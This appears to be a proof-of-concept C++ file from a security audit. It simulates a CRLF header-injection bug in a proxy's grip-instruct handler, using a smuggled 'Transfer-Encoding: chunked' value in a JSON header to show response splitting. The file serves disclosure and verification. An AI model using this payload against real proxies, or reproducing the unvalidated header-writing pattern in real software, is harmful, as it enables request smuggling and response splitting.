// PoC for finding 022: src/handler/instruct.cpp:600 (also :617, :634).
//
// Instruct::fromResponse parses an application/grip-instruct JSON body, reads
// the response.headers entries, and appends each (name, value) pair to
// newResponse.headers without rejecting CR or LF. Those bytes survive the
// proxy pipeline and reach the HTTP/1 writer at src/core/http1/protocol.rs:998
// where the header line is emitted as "{name}: {value}\r\n" -- a CRLF in the
// value terminates the header line and starts a new attacker-controlled one.
//
// This PoC re-implements the relevant parsing logic with a minimal JSON
// reader (the malicious payload is hand-tokenized so we don't need a JSON
// library). It then runs the parsed (name, value) pair through the same
// HTTP/1 status-line + header writer pattern, byte for byte, that
// src/core/http1/protocol.rs:987-1000 uses.

#include <cstdio>
#include <cstdlib>
#include <string>
#include <vector>
#include <utility>

using Header = std::pair<std::string, std::string>;
using Headers = std::vector<Header>;

struct Response {
    int code = 200;
    std::string reason = "OK";
    Headers headers;
    std::string body;
};

// Mirrors src/handler/instruct.cpp:573-601 for the list-form headers shape.
// On the unpatched code path: takes (name, val) directly into HttpHeader and
// appends. There is *no* hasLineBreak() check here.
static void appendInstructHeader(Response *resp, const std::string &name,
                                 const std::string &val) {
    // Unpatched line at src/handler/instruct.cpp:600:
    //     newResponse.headers += HttpHeader(name.toUtf8(), val.toUtf8());
    resp->headers.push_back({name, val});
}

// Mirrors src/core/http1/protocol.rs:981-1001 -- the status line plus header
// loop. Writes name: value\r\n verbatim with no validation.
static std::string serializeHttp1(const Response &r) {
    std::string out = "HTTP/1.1 " + std::to_string(r.code) + " " + r.reason + "\r\n";
    for (const auto &h : r.headers) {
        out += h.first + ": " + h.second + "\r\n";
    }
    out += "\r\n";
    out += r.body;
    return out;
}

static std::string escape(const std::string &s) {
    std::string o;
    for (char c : s) {
        switch (c) {
        case '\r': o += "\\r"; break;
        case '\n': o += "\\n"; break;
        default:   o += c;
        }
    }
    return o;
}

int main() {
    // Attacker-controlled grip-instruct JSON the backend would return.
    // For clarity we feed the parsed values directly to the same function
    // that the unpatched Instruct::fromResponse calls.
    const std::string jsonPayload =
        "{\n"
        "  \"response\": {\n"
        "    \"headers\": [\n"
        "      [\"X-Test\", \"ok\\r\\nTransfer-Encoding: chunked\"]\n"
        "    ],\n"
        "    \"body\": \"hello\"\n"
        "  }\n"
        "}\n";

    std::printf("=== Attacker grip-instruct JSON ===\n%s\n", jsonPayload.c_str());

    // The two values that Instruct::fromResponse would extract from the JSON
    // above (after JSON unescaping). The unpatched code stores them as-is.
    const std::string headerName = "X-Test";
    const std::string headerVal  = std::string("ok\r\nTransfer-Encoding: chunked");

    Response r;
    r.body = "hello";
    appendInstructHeader(&r, headerName, headerVal);

    std::string wire = serializeHttp1(r);

    std::printf("=== Resulting HTTP/1 bytes (escaped) ===\n%s\n",
                escape(wire).c_str());

    std::printf("=== Resulting HTTP/1 bytes (raw) ===\n%s\n", wire.c_str());

    bool injected = wire.find("\r\nTransfer-Encoding: chunked\r\n") != std::string::npos;

    if (injected) {
        std::puts("RESULT: vulnerable. CRLF inside the JSON header value crossed the");
        std::puts("        Instruct->HTTP/1 boundary and produced a separate");
        std::puts("        Transfer-Encoding header on the wire. Adjacent peers may");
        std::puts("        disagree on framing -- response splitting / smuggling primitive.");
        return 0;
    }

    std::puts("RESULT: did not reproduce");
    return 1;
}
